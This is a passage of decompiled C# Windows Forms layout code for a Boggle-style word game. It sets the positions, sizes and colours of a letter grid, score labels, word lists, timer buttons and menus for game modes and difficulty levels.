      BogBorder bogBorder2_2 = this.BogBorder2;
      size1 = new Size(10, 102);
      Size size5 = size1;
      bogBorder2_2.Size = size5;
      this.BogBorder2.TabIndex = 14;
      this.BogBorder2.TabStop = false;
      this.BogBorder6.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder6.BorderDirection = BogBorder.Direction.Top;
      BogBorder bogBorder6_1 = this.BogBorder6;
      point1 = new Point(69, 16);
      Point point6 = point1;
      bogBorder6_1.Location = point6;
      this.BogBorder6.Name = "BogBorder6";
      BogBorder bogBorder6_2 = this.BogBorder6;
      size1 = new Size(168, 9);
      Size size6 = size1;
      bogBorder6_2.Size = size6;
      this.BogBorder6.TabIndex = 15;
      this.BogBorder6.TabStop = false;
      this.BogBorder7.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder7.BorderDirection = BogBorder.Direction.Bottom;
      BogBorder bogBorder7_1 = this.BogBorder7;
      point1 = new Point(69, 104);
      Point point7 = point1;
      bogBorder7_1.Location = point7;
      this.BogBorder7.Name = "BogBorder7";
      BogBorder bogBorder7_2 = this.BogBorder7;
      size1 = new Size(168, 9);
      Size size7 = size1;
      bogBorder7_2.Size = size7;
      this.BogBorder7.TabIndex = 16;
      this.BogBorder7.TabStop = false;
      this.BogBorder8.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder8.BorderDirection = BogBorder.Direction.Right;
      BogBorder bogBorder8_1 = this.BogBorder8;
      point1 = new Point(237, 16);
      Point point8 = point1;
      bogBorder8_1.Location = point8;
      this.BogBorder8.Name = "BogBorder8";
      BogBorder bogBorder8_2 = this.BogBorder8;
      size1 = new Size(10, 97);
      Size size8 = size1;
      bogBorder8_2.Size = size8;
      this.BogBorder8.TabIndex = 17;
      this.BogBorder8.TabStop = false;
      this.lbl1.BackColor = System.Drawing.Color.LightGray;
      this.lbl1.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl1.CubeText = "W";
      this.lbl1.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl1.CubeTopRadius = 55L;
      CircleLabel lbl1_1 = this.lbl1;
      point1 = new Point(386, 186);
      Point point9 = point1;
      lbl1_1.Location = point9;
      this.lbl1.Name = "lbl1";
      CircleLabel lbl1_2 = this.lbl1;
      size1 = new Size(55, 55);
      Size size9 = size1;
      lbl1_2.Size = size9;
      this.lbl1.TabIndex = 19;
      this.lbl1.Tag = (object) "00";
      this.lbl4.BackColor = System.Drawing.Color.LightGray;
      this.lbl4.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl4.CubeText = "W";
      this.lbl4.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl4.CubeTopRadius = 55L;
      CircleLabel lbl4_1 = this.lbl4;
      point1 = new Point(609, 190);
      Point point10 = point1;
      lbl4_1.Location = point10;
      this.lbl4.Name = "lbl4";
      CircleLabel lbl4_2 = this.lbl4;
      size1 = new Size(55, 55);
      Size size10 = size1;
      lbl4_2.Size = size10;
      this.lbl4.TabIndex = 20;
      this.lbl4.Tag = (object) "30";
      this.lbl3.BackColor = System.Drawing.Color.LightGray;
      this.lbl3.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl3.CubeText = "W";
      this.lbl3.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl3.CubeTopRadius = 55L;
      CircleLabel lbl3_1 = this.lbl3;
      point1 = new Point(532, 189);
      Point point11 = point1;
      lbl3_1.Location = point11;
      this.lbl3.Name = "lbl3";
      CircleLabel lbl3_2 = this.lbl3;
      size1 = new Size(55, 55);
      Size size11 = size1;
      lbl3_2.Size = size11;
      this.lbl3.TabIndex = 21;
      this.lbl3.Tag = (object) "20";
      this.lbl2.BackColor = System.Drawing.Color.LightGray;
      this.lbl2.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl2.CubeText = "W";
      this.lbl2.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl2.CubeTopRadius = 55L;
      CircleLabel lbl2_1 = this.lbl2;
      point1 = new Point(459, 188);
      Point point12 = point1;
      lbl2_1.Location = point12;
      this.lbl2.Name = "lbl2";
      CircleLabel lbl2_2 = this.lbl2;
      size1 = new Size(55, 55);
      Size size12 = size1;
      lbl2_2.Size = size12;
      this.lbl2.TabIndex = 22;
      this.lbl2.Tag = (object) "10";
      this.lbl5.BackColor = System.Drawing.Color.LightGray;
      this.lbl5.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl5.CubeText = "W";
      this.lbl5.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl5.CubeTopRadius = 55L;
      CircleLabel lbl5_1 = this.lbl5;
      point1 = new Point(389, 262);
      Point point13 = point1;
      lbl5_1.Location = point13;
      this.lbl5.Name = "lbl5";
      CircleLabel lbl5_2 = this.lbl5;
      size1 = new Size(55, 55);
      Size size13 = size1;
      lbl5_2.Size = size13;
      this.lbl5.TabIndex = 23;
      this.lbl5.Tag = (object) "01";
      this.lbl6.BackColor = System.Drawing.Color.LightGray;
      this.lbl6.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl6.CubeText = "W";
      this.lbl6.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl6.CubeTopRadius = 55L;
      CircleLabel lbl6_1 = this.lbl6;
      point1 = new Point(462, 261);
      Point point14 = point1;
      lbl6_1.Location = point14;
      this.lbl6.Name = "lbl6";
      CircleLabel lbl6_2 = this.lbl6;
      size1 = new Size(55, 55);
      Size size14 = size1;
      lbl6_2.Size = size14;
      this.lbl6.TabIndex = 24;
      this.lbl6.Tag = (object) "11";
      this.lbl7.BackColor = System.Drawing.Color.LightGray;
      this.lbl7.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl7.CubeText = "W";
      this.lbl7.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl7.CubeTopRadius = 55L;
      CircleLabel lbl7_1 = this.lbl7;
      point1 = new Point(535, 261);
      Point point15 = point1;
      lbl7_1.Location = point15;
      this.lbl7.Name = "lbl7";
      CircleLabel lbl7_2 = this.lbl7;
      size1 = new Size(55, 55);
      Size size15 = size1;
      lbl7_2.Size = size15;
      this.lbl7.TabIndex = 25;
      this.lbl7.Tag = (object) "21";
      this.lbl8.BackColor = System.Drawing.Color.LightGray;
      this.lbl8.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl8.CubeText = "W";
      this.lbl8.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl8.CubeTopRadius = 55L;
      CircleLabel lbl8_1 = this.lbl8;
      point1 = new Point(612, 261);
      Point point16 = point1;
      lbl8_1.Location = point16;
      this.lbl8.Name = "lbl8";
      CircleLabel lbl8_2 = this.lbl8;
      size1 = new Size(55, 55);
      Size size16 = size1;
      lbl8_2.Size = size16;
      this.lbl8.TabIndex = 26;
      this.lbl8.Tag = (object) "31";
      this.lbl9.BackColor = System.Drawing.Color.LightGray;
      this.lbl9.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl9.CubeText = "W";
      this.lbl9.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl9.CubeTopRadius = 55L;
      CircleLabel lbl9_1 = this.lbl9;
      point1 = new Point(393, 340);
      Point point17 = point1;
      lbl9_1.Location = point17;
      this.lbl9.Name = "lbl9";
      CircleLabel lbl9_2 = this.lbl9;
      size1 = new Size(55, 55);
      Size size17 = size1;
      lbl9_2.Size = size17;
      this.lbl9.TabIndex = 27;
      this.lbl9.Tag = (object) "02";
      this.lbl10.BackColor = System.Drawing.Color.LightGray;
      this.lbl10.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl10.CubeText = "W";
      this.lbl10.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl10.CubeTopRadius = 55L;
      CircleLabel lbl10_1 = this.lbl10;
      point1 = new Point(462, 342);
      Point point18 = point1;
      lbl10_1.Location = point18;
      this.lbl10.Name = "lbl10";
      CircleLabel lbl10_2 = this.lbl10;
      size1 = new Size(55, 55);
      Size size18 = size1;
      lbl10_2.Size = size18;
      this.lbl10.TabIndex = 28;
      this.lbl10.Tag = (object) "12";
      this.lbl11.BackColor = System.Drawing.Color.LightGray;
      this.lbl11.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl11.CubeText = "W";
      this.lbl11.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl11.CubeTopRadius = 55L;
      CircleLabel lbl11_1 = this.lbl11;
      point1 = new Point(537, 339);
      Point point19 = point1;
      lbl11_1.Location = point19;
      this.lbl11.Name = "lbl11";
      CircleLabel lbl11_2 = this.lbl11;
      size1 = new Size(55, 55);
      Size size19 = size1;
      lbl11_2.Size = size19;
      this.lbl11.TabIndex = 29;
      this.lbl11.Tag = (object) "22";
      this.lbl12.BackColor = System.Drawing.Color.LightGray;
      this.lbl12.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl12.CubeText = "W";
      this.lbl12.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl12.CubeTopRadius = 55L;
      CircleLabel lbl12_1 = this.lbl12;
      point1 = new Point(613, 338);
      Point point20 = point1;
      lbl12_1.Location = point20;
      this.lbl12.Name = "lbl12";
      CircleLabel lbl12_2 = this.lbl12;
      size1 = new Size(55, 55);
      Size size20 = size1;
      lbl12_2.Size = size20;
      this.lbl12.TabIndex = 30;
      this.lbl12.Tag = (object) "32";
      this.lbl13.BackColor = System.Drawing.Color.LightGray;
      this.lbl13.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl13.CubeText = "W";
      this.lbl13.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl13.CubeTopRadius = 55L;
      CircleLabel lbl13_1 = this.lbl13;
      point1 = new Point(389, 415);
      Point point21 = point1;
      lbl13_1.Location = point21;
      this.lbl13.Name = "lbl13";
      CircleLabel lbl13_2 = this.lbl13;
      size1 = new Size(55, 55);
      Size size21 = size1;
      lbl13_2.Size = size21;
      this.lbl13.TabIndex = 31;
      this.lbl13.Tag = (object) "03";
      this.lbl14.BackColor = System.Drawing.Color.LightGray;
      this.lbl14.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl14.CubeText = "W";
      this.lbl14.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl14.CubeTopRadius = 55L;
      CircleLabel lbl14_1 = this.lbl14;
      point1 = new Point(463, 412);
      Point point22 = point1;
      lbl14_1.Location = point22;
      this.lbl14.Name = "lbl14";
      CircleLabel lbl14_2 = this.lbl14;
      size1 = new Size(55, 55);
      Size size22 = size1;
      lbl14_2.Size = size22;
      this.lbl14.TabIndex = 32;
      this.lbl14.Tag = (object) "13";
      this.lbl15.BackColor = System.Drawing.Color.LightGray;
      this.lbl15.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl15.CubeText = "W";
      this.lbl15.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl15.CubeTopRadius = 55L;
      CircleLabel lbl15_1 = this.lbl15;
      point1 = new Point(542, 413);
      Point point23 = point1;
      lbl15_1.Location = point23;
      this.lbl15.Name = "lbl15";
      CircleLabel lbl15_2 = this.lbl15;
      size1 = new Size(55, 55);
      Size size23 = size1;
      lbl15_2.Size = size23;
      this.lbl15.TabIndex = 33;
      this.lbl15.Tag = (object) "23";
      this.lbl16.BackColor = System.Drawing.Color.LightGray;
      this.lbl16.CubeHighLight = System.Drawing.Color.LightGray;
      this.lbl16.CubeText = "W";
      this.lbl16.CubeTextColor = System.Drawing.Color.DarkBlue;
      this.lbl16.CubeTopRadius = 55L;
      CircleLabel lbl16_1 = this.lbl16;
      point1 = new Point(613, 414);
      Point point24 = point1;
      lbl16_1.Location = point24;
      this.lbl16.Name = "lbl16";
      CircleLabel lbl16_2 = this.lbl16;
      size1 = new Size(55, 55);
      Size size24 = size1;
      lbl16_2.Size = size24;
      this.lbl16.TabIndex = 34;
      this.lbl16.Tag = (object) "33";
      this.picCubeDown.BackColor = System.Drawing.Color.FromArgb(0, 0, 192);
      PictureBox picCubeDown1 = this.picCubeDown;
      point1 = new Point(693, 189);
      Point point25 = point1;
      picCubeDown1.Location = point25;
      this.picCubeDown.Name = "picCubeDown";
      PictureBox picCubeDown2 = this.picCubeDown;
      size1 = new Size(74, 75);
      Size size25 = size1;
      picCubeDown2.Size = size25;
      this.picCubeDown.TabIndex = 35;
      this.picCubeDown.TabStop = false;
      this.btnAddWord.BogButtonEnabled = false;
      this.btnAddWord.ButtonText = "Add Word";
      BogButton btnAddWord1 = this.btnAddWord;
      point1 = new Point(187, 180);
      Point point26 = point1;
      btnAddWord1.Location = point26;
      this.btnAddWord.Name = "btnAddWord";
      BogButton btnAddWord2 = this.btnAddWord;
      size1 = new Size(93, 49);
      Size size26 = size1;
      btnAddWord2.Size = size26;
      this.btnAddWord.TabIndex = 36;
      this.btnAddWord.Tag = (object) "Continue";
      this.btnAddWord.Text = "Add Word";
      this.lstHumanWordsFound.BackColor = System.Drawing.Color.Black;
      this.lstHumanWordsFound.BorderStyle = BorderStyle.None;
      this.lstHumanWordsFound.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lstHumanWordsFound.ForeColor = System.Drawing.Color.DodgerBlue;
      ListBox lstHumanWordsFound1 = this.lstHumanWordsFound;
      point1 = new Point(58, 381);
      Point point27 = point1;
      lstHumanWordsFound1.Location = point27;
      this.lstHumanWordsFound.Name = "lstHumanWordsFound";
      ListBox lstHumanWordsFound2 = this.lstHumanWordsFound;
      size1 = new Size(81, 234);
      Size size27 = size1;
      lstHumanWordsFound2.Size = size27;
      this.lstHumanWordsFound.TabIndex = 40;
      this.mnuMain.MenuItems.AddRange(new MenuItem[3]
      {
        this.mnuGame,
        this.mnuOptions,
        this.mnuHelp
      });
      this.mnuGame.Enabled = false;
      this.mnuGame.Index = 0;
      this.mnuGame.MenuItems.AddRange(new MenuItem[6]
      {
        this.mnuNewGame,
        this.mnuEndGame,
        this.MenuItem8,
        this.mnuHighScores,
        this.MenuItem2,
        this.mnuExitGame
      });
      this.mnuGame.Text = "&Game";
      this.mnuNewGame.Index = 0;
      this.mnuNewGame.Text = "New Game...";
      this.mnuEndGame.Index = 1;
      this.mnuEndGame.Text = "End Game";
      this.MenuItem8.Index = 2;
      this.MenuItem8.Text = "-";
      this.mnuHighScores.Index = 3;
      this.mnuHighScores.Text = "High Scores...";
      this.MenuItem2.Index = 4;
      this.MenuItem2.Text = "-";
      this.mnuExitGame.Index = 5;
      this.mnuExitGame.Text = "Exit ";
      this.mnuOptions.Enabled = false;
      this.mnuOptions.Index = 1;
      this.mnuOptions.MenuItems.AddRange(new MenuItem[13]
      {
        this.mnuEnableDefSearch,
        this.MenuItem1,
        this.mnuMode,
        this.MenuItem3,
        this.mnuLevelEasy,
        this.mnuLevelMedium,
        this.mnuLevelHard,
        this.mnuLevelImpossible,
        this.MenuItem4,
        this.mnuTimerInterval,
        this.mnuEnableTimerFlash,
        this.MenuItem5,
        this.mnuEnableWordValidation
      });
      this.mnuOptions.Text = "&Options";
      this.mnuEnableDefSearch.Index = 0;
      this.mnuEnableDefSearch.Text = "Enable Defention Search";
      this.MenuItem1.Index = 1;
      this.MenuItem1.Text = "-";
      this.mnuMode.Index = 2;
      this.mnuMode.MenuItems.AddRange(new MenuItem[3]
      {
        this.mnuBoardGameMode,
        this.mnuVsMode,
        this.mnuTeachingMode
      });
      this.mnuMode.Text = "Mode...";
      this.mnuBoardGameMode.Index = 0;
      this.mnuBoardGameMode.Text = "Board Game Mode";
      this.mnuVsMode.Index = 1;
      this.mnuVsMode.Text = "Vs. Computer Mode";
      this.mnuTeachingMode.Index = 2;
      this.mnuTeachingMode.Text = "Teaching Mode";
      this.MenuItem3.Index = 3;
      this.MenuItem3.Text = "-";
      this.mnuLevelEasy.Index = 4;
      this.mnuLevelEasy.Text = "Level Easy";
      this.mnuLevelMedium.Index = 5;
      this.mnuLevelMedium.Text = "Level Medium";
      this.mnuLevelHard.Index = 6;
      this.mnuLevelHard.Text = "Level Hard";
      this.mnuLevelImpossible.Index = 7;
      this.mnuLevelImpossible.Text = "Level Impossible ";
      this.MenuItem4.Index = 8;
      this.MenuItem4.Text = "-";
      this.mnuTimerInterval.Index = 9;
      this.mnuTimerInterval.MenuItems.AddRange(new MenuItem[10]
      {
        this.mnuTmr30,
        this.mnuTmr100,
        this.mnuTmr130,
        this.mnuTmr200,
        this.mnuTmr230,
        this.mnuTmr300,
        this.mnuTmr330,
        this.mnuTmr400,
        this.mnuTmr430,
        this.mnuTmr500
      });
      this.mnuTimerInterval.Text = "Timer Interval...";
      this.mnuTmr30.Index = 0;
      this.mnuTmr30.Text = ":30";
      this.mnuTmr100.Index = 1;
      this.mnuTmr100.Text = "1:00";
      this.mnuTmr130.Index = 2;
      this.mnuTmr130.Text = "1:30";
      this.mnuTmr200.Index = 3;
      this.mnuTmr200.Text = "2:00";
      this.mnuTmr230.Index = 4;
      this.mnuTmr230.Text = "2:30";
      this.mnuTmr300.Index = 5;
      this.mnuTmr300.Text = "3:00";
      this.mnuTmr330.Index = 6;
      this.mnuTmr330.Text = "3:30";
      this.mnuTmr400.Index = 7;
      this.mnuTmr400.Text = "4:00";
      this.mnuTmr430.Index = 8;
      this.mnuTmr430.Text = "4:30";
      this.mnuTmr500.Index = 9;
      this.mnuTmr500.Text = "5:00";
      this.mnuEnableTimerFlash.Index = 10;
      this.mnuEnableTimerFlash.Text = "Enable Timer Flash";
      this.MenuItem5.Index = 11;
      this.MenuItem5.Text = "-";
      this.mnuEnableWordValidation.Index = 12;
      this.mnuEnableWordValidation.Text = "Enable Word Validation";
      this.mnuHelp.Enabled = false;
      this.mnuHelp.Index = 2;
      this.mnuHelp.MenuItems.AddRange(new MenuItem[3]
      {
        this.mnuAbout,
        this.MenuItem6,
        this.mnuTips
      });
      this.mnuHelp.Text = "&Help";
      this.mnuAbout.Index = 0;
      this.mnuAbout.Text = "About...";
      this.MenuItem6.Index = 1;
      this.MenuItem6.Text = "-";
      this.mnuTips.Index = 2;
      this.mnuTips.Text = "Tips...";
      this.tmrContMain.Enabled = true;
      this.tmrContMain.Interval = 500;
      this.txtWordFound.BackColor = System.Drawing.Color.Silver;
      this.txtWordFound.BorderStyle = BorderStyle.FixedSingle;
      this.txtWordFound.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.txtWordFound.ForeColor = System.Drawing.Color.FromArgb(0, 0, 192);
      TextBox txtWordFound1 = this.txtWordFound;
      point1 = new Point(35, 203);
      Point point28 = point1;
      txtWordFound1.Location = point28;
      this.txtWordFound.Name = "txtWordFound";
      TextBox txtWordFound2 = this.txtWordFound;
      size1 = new Size(116, 22);
      Size size28 = size1;
      txtWordFound2.Size = size28;
      this.txtWordFound.TabIndex = 41;
      this.txtWordFound.Text = "";
      this.lblHumanScore.BackColor = System.Drawing.Color.Silver;
      this.lblHumanScore.BorderStyle = BorderStyle.FixedSingle;
      this.lblHumanScore.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblHumanScore.ForeColor = System.Drawing.Color.FromArgb(0, 0, 192);
      Label lblHumanScore1 = this.lblHumanScore;
      point1 = new Point(35, 244);
      Point point29 = point1;
      lblHumanScore1.Location = point29;
      this.lblHumanScore.Name = "lblHumanScore";
      Label lblHumanScore2 = this.lblHumanScore;
      size1 = new Size(80, 19);
      Size size29 = size1;
      lblHumanScore2.Size = size29;
      this.lblHumanScore.TabIndex = 42;
      this.lblHumanScore.Text = "0";
      this.Panel1.BackColor = System.Drawing.Color.Black;
      Panel panel1_1 = this.Panel1;
      point1 = new Point(365, 75);
      Point point30 = point1;
      panel1_1.Location = point30;
      this.Panel1.Name = "Panel1";
      Panel panel1_2 = this.Panel1;
      size1 = new Size(17, 97);
      Size size30 = size1;
      panel1_2.Size = size30;
      this.Panel1.TabIndex = 43;
      this.pnlScore.BackColor = System.Drawing.Color.DarkGray;
      BogPanel pnlScore1 = this.pnlScore;
      point1 = new Point(-3, 161);
      Point point31 = point1;
      pnlScore1.Location = point31;
      this.pnlScore.Name = "pnlScore";
      BogPanel pnlScore2 = this.pnlScore;
      size1 = new Size(318, 174);
      Size size31 = size1;
      pnlScore2.Size = size31;
      this.pnlScore.TabIndex = 46;
      this.pnlScore.TabStop = false;
      this.pnlWords.BackColor = System.Drawing.Color.DarkGray;
      BogPanel pnlWords1 = this.pnlWords;
      point1 = new Point(-5, 331);
      Point point32 = point1;
      pnlWords1.Location = point32;
      this.pnlWords.Name = "pnlWords";
      BogPanel pnlWords2 = this.pnlWords;
      size1 = new Size(318, 315);
      Size size32 = size1;
      pnlWords2.Size = size32;
      this.pnlWords.TabIndex = 47;
      this.pnlWords.TabStop = false;
      this.BogBorder9.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder9.BorderDirection = BogBorder.Direction.Left;
      BogBorder bogBorder9_1 = this.BogBorder9;
      point1 = new Point(48, 370);
      Point point33 = point1;
      bogBorder9_1.Location = point33;
      this.BogBorder9.Name = "BogBorder9";
      BogBorder bogBorder9_2 = this.BogBorder9;
      size1 = new Size(12, 258);
      Size size33 = size1;
      bogBorder9_2.Size = size33;
      this.BogBorder9.TabIndex = 48;
      this.BogBorder9.TabStop = false;
      this.BogBorder10.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder10.BorderDirection = BogBorder.Direction.Right;
      BogBorder bogBorder10_1 = this.BogBorder10;
      point1 = new Point(139, 372);
      Point point34 = point1;
      bogBorder10_1.Location = point34;
      this.BogBorder10.Name = "BogBorder10";
      BogBorder bogBorder10_2 = this.BogBorder10;
      size1 = new Size(12, 254);
      Size size34 = size1;
      bogBorder10_2.Size = size34;
      this.BogBorder10.TabIndex = 49;
      this.BogBorder10.TabStop = false;
      this.BogBorder11.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder11.BorderDirection = BogBorder.Direction.Top;
      BogBorder bogBorder11_1 = this.BogBorder11;
      point1 = new Point(60, 372);
      Point point35 = point1;
      bogBorder11_1.Location = point35;
      this.BogBorder11.Name = "BogBorder11";
      BogBorder bogBorder11_2 = this.BogBorder11;
      size1 = new Size(80, 11);
      Size size35 = size1;
      bogBorder11_2.Size = size35;
      this.BogBorder11.TabIndex = 50;
      this.BogBorder11.TabStop = false;
      this.BogBorder12.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder12.BorderDirection = BogBorder.Direction.Bottom;
      BogBorder bogBorder12_1 = this.BogBorder12;
      point1 = new Point(60, 615);
      Point point36 = point1;
      bogBorder12_1.Location = point36;
      this.BogBorder12.Name = "BogBorder12";
      BogBorder bogBorder12_2 = this.BogBorder12;
      size1 = new Size(81, 11);
      Size size36 = size1;
      bogBorder12_2.Size = size36;
      this.BogBorder12.TabIndex = 51;
      this.BogBorder12.TabStop = false;
      this.BogBorder13.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder13.BorderDirection = BogBorder.Direction.Bottom;
      BogBorder bogBorder13_1 = this.BogBorder13;
      point1 = new Point(170, 614);
      Point point37 = point1;
      bogBorder13_1.Location = point37;
      this.BogBorder13.Name = "BogBorder13";
      BogBorder bogBorder13_2 = this.BogBorder13;
      size1 = new Size(81, 11);
      Size size37 = size1;
      bogBorder13_2.Size = size37;
      this.BogBorder13.TabIndex = 56;
      this.BogBorder13.TabStop = false;
      this.BogBorder14.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder14.BorderDirection = BogBorder.Direction.Top;
      BogBorder bogBorder14_1 = this.BogBorder14;
      point1 = new Point(170, 371);
      Point point38 = point1;
      bogBorder14_1.Location = point38;
      this.BogBorder14.Name = "BogBorder14";
      BogBorder bogBorder14_2 = this.BogBorder14;
      size1 = new Size(80, 11);
      Size size38 = size1;
      bogBorder14_2.Size = size38;
      this.BogBorder14.TabIndex = 55;
      this.BogBorder14.TabStop = false;
      this.BogBorder15.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder15.BorderDirection = BogBorder.Direction.Right;
      BogBorder bogBorder15_1 = this.BogBorder15;
      point1 = new Point(249, 371);
      Point point39 = point1;
      bogBorder15_1.Location = point39;
      this.BogBorder15.Name = "BogBorder15";
      BogBorder bogBorder15_2 = this.BogBorder15;
      size1 = new Size(12, 254);
      Size size39 = size1;
      bogBorder15_2.Size = size39;
      this.BogBorder15.TabIndex = 54;
      this.BogBorder15.TabStop = false;
      this.BogBorder16.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder16.BorderDirection = BogBorder.Direction.Left;
      BogBorder bogBorder16_1 = this.BogBorder16;
      point1 = new Point(158, 369);
      Point point40 = point1;
      bogBorder16_1.Location = point40;
      this.BogBorder16.Name = "BogBorder16";
      BogBorder bogBorder16_2 = this.BogBorder16;
      size1 = new Size(12, 258);
      Size size40 = size1;
      bogBorder16_2.Size = size40;
      this.BogBorder16.TabIndex = 53;
      this.BogBorder16.TabStop = false;
      this.lstCompFoundWords.BackColor = System.Drawing.Color.Black;
      this.lstCompFoundWords.BorderStyle = BorderStyle.None;
      this.lstCompFoundWords.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lstCompFoundWords.ForeColor = System.Drawing.Color.DodgerBlue;
      ListBox lstCompFoundWords1 = this.lstCompFoundWords;
      point1 = new Point(168, 380);
      Point point41 = point1;
      lstCompFoundWords1.Location = point41;
      this.lstCompFoundWords.Name = "lstCompFoundWords";
      ListBox lstCompFoundWords2 = this.lstCompFoundWords;
      size1 = new Size(81, 234);
      Size size41 = size1;
      lstCompFoundWords2.Size = size41;
      this.lstCompFoundWords.TabIndex = 52;
      this.tmrBtn1.BackColor = System.Drawing.Color.Gray;
      Button tmrBtn1_1 = this.tmrBtn1;
      point1 = new Point(89, 132);
      Point point42 = point1;
      tmrBtn1_1.Location = point42;
      this.tmrBtn1.Name = "tmrBtn1";
      Button tmrBtn1_2 = this.tmrBtn1;
      size1 = new Size(21, 12);
      Size size42 = size1;
      tmrBtn1_2.Size = size42;
      this.tmrBtn1.TabIndex = 57;
      this.tmrBtn2.BackColor = System.Drawing.Color.Gray;
      Button tmrBtn2_1 = this.tmrBtn2;
      point1 = new Point(126, 132);
      Point point43 = point1;
      tmrBtn2_1.Location = point43;
      this.tmrBtn2.Name = "tmrBtn2";
      Button tmrBtn2_2 = this.tmrBtn2;
      size1 = new Size(21, 12);
      Size size43 = size1;
      tmrBtn2_2.Size = size43;
      this.tmrBtn2.TabIndex = 58;
      this.tmrBtn3.BackColor = System.Drawing.Color.Gray;
      Button tmrBtn3_1 = this.tmrBtn3;
      point1 = new Point(198, 132);
      Point point44 = point1;
      tmrBtn3_1.Location = point44;
      this.tmrBtn3.Name = "tmrBtn3";
      Button tmrBtn3_2 = this.tmrBtn3;
      size1 = new Size(21, 12);
      Size size44 = size1;
      tmrBtn3_2.Size = size44;
      this.tmrBtn3.TabIndex = 59;
      this.tmrBtn4.BackColor = System.Drawing.Color.Gray;
      Button tmrBtn4_1 = this.tmrBtn4;
      point1 = new Point(162, 132);
      Point point45 = point1;
      tmrBtn4_1.Location = point45;
      this.tmrBtn4.Name = "tmrBtn4";
      Button tmrBtn4_2 = this.tmrBtn4;
      size1 = new Size(21, 12);
      Size size45 = size1;
      tmrBtn4_2.Size = size45;
      this.tmrBtn4.TabIndex = 60;
      this.Label1.AutoSize = true;
      this.Label1.BackColor = System.Drawing.Color.DarkGray;
      this.Label1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = System.Drawing.Color.Black;
      Label label1_1 = this.Label1;
      point1 = new Point(65, 357);
      Point point46 = point1;
      label1_1.Location = point46;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(66, 13);
      Size size46 = size1;
      label1_2.Size = size46;
      this.Label1.TabIndex = 61;
      this.Label1.Text = "Your Words";
      this.Label2.AutoSize = true;
      this.Label2.BackColor = System.Drawing.Color.DarkGray;
      this.Label2.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label2.ForeColor = System.Drawing.Color.Black;
      Label label2_1 = this.Label2;
      point1 = new Point(179, 357);
      Point point47 = point1;
      label2_1.Location = point47;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(57, 13);
      Size size47 = size1;
      label2_2.Size = size47;
      this.Label2.TabIndex = 62;
      this.Label2.Text = "My Words";
      this.lblCompScore.BackColor = System.Drawing.Color.Silver;
      this.lblCompScore.BorderStyle = BorderStyle.FixedSingle;
      this.lblCompScore.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblCompScore.ForeColor = System.Drawing.Color.FromArgb(0, 0, 192);
      Label lblCompScore1 = this.lblCompScore;
      point1 = new Point(35, 289);
      Point point48 = point1;
      lblCompScore1.Location = point48;
      this.lblCompScore.Name = "lblCompScore";
      Label lblCompScore2 = this.lblCompScore;
      size1 = new Size(80, 19);
      Size size48 = size1;
      lblCompScore2.Size = size48;
      this.lblCompScore.TabIndex = 63;
      this.lblCompScore.Text = "0";
      this.Label3.AutoSize = true;
      this.Label3.BackColor = System.Drawing.Color.DarkGray;
      this.Label3.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label3.ForeColor = System.Drawing.Color.Black;
      Label label3_1 = this.Label3;
      point1 = new Point(35, 229);
      Point point49 = point1;
      label3_1.Location = point49;
      this.Label3.Name = "Label3";
      Label label3_2 = this.Label3;
      size1 = new Size(63, 13);
      Size size49 = size1;
      label3_2.Size = size49;
      this.Label3.TabIndex = 64;
